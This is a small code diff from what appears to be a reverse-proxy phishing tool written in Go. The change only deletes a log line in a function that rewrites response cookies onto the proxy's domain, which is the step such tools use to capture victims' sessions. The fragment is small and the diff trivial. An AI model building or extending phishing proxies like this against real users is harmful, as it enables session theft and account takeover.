@@ -167,7 +167,6 @@ func (p *phishingProxy) modifyCookieHeader(response *http.Response) error {
 		mcook = append(mcook, value.String())
 		if p.Reverse.CookieDomain != "" {
 			value.Domain = p.Reverse.CookieDomain
-			log.Printf("Use reverse domain %s\n", p.Reverse.CookieDomain)
 		}
 		mcook = append(mcook, value.String())
 	}
